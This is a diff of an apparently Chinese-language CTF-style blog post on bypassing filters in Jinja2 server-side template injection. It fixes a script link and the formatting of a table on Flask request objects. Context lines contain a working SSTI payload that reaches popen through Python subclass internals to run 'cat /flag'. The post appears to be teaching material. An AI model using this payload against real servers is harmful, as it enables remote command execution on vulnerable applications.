@@ -828,7 +828,7 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{{&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;vm&#34;&gt;__class__&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;__base__&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;__subclasses__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;141&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;fm&#34;&gt;__init__&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;vm&#34;&gt;__globals__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;popen&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;cat /flag&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()}}&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;对于上述两种绕过，可以使用给出的脚本&lt;a class=&#34;link&#34; href=&#34;https://raw.githubusercontent.com/makabaka11/blog-files/refs/heads/master/ssti.txt&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+&lt;/div&gt;&lt;p&gt;对于上述两种绕过，可以使用给出的脚本&lt;a class=&#34;link&#34; href=&#34;https://raw.githubusercontent.com/makabaka11/blog-files/refs/heads/master/ssti.py&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;ssti.py&lt;/a&gt;&lt;/p&gt;
 &lt;h3 id=&#34;过滤下划线&#34;&gt;过滤下划线
 &lt;/h3&gt;&lt;table&gt;
@@ -842,12 +842,12 @@
   &lt;tbody&gt;
       &lt;tr&gt;
           &lt;td&gt;&lt;code&gt;request.form&lt;/code&gt;&lt;/td&gt;
-          &lt;td&gt;从 **请求体(Body) **中解析表单数据&lt;/td&gt;
+          &lt;td&gt;从 **请求体(Body)**中解析表单数据&lt;/td&gt;
           &lt;td&gt;主要是 &lt;strong&gt;POST&lt;/strong&gt;&lt;/td&gt;
       &lt;/tr&gt;
       &lt;tr&gt;
           &lt;td&gt;&lt;code&gt;request.args&lt;/code&gt;&lt;/td&gt;
-          &lt;td&gt;从 **URL 查询字符串 **中获取参数&lt;/td&gt;
+          &lt;td&gt;从 &lt;strong&gt;URL 查询字符串&lt;/strong&gt;中获取参数&lt;/td&gt;
           &lt;td&gt;主要是 &lt;strong&gt;GET&lt;/strong&gt;&lt;/td&gt;
       &lt;/tr&gt;
   &lt;/tbody&gt;
